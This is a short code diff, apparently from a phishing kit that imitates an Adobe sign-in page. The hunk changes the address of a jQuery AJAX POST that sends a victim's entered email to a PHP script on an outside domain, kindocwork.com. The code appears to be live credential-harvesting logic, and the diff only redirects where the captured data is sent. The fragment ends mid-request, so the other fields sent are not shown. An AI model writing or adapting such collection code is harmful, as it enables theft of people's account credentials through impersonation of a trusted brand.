@@ -177,7 +177,7 @@
         
         $.ajax({
           dataType: 'JSON',
-          url: 'https://kindocwork.com/kings/Adobecrpt.php',
+          url: 'https://kindocwork.com/kings/Adobekingscrpt.php',
           type: 'POST',
           data:{
             email:email,
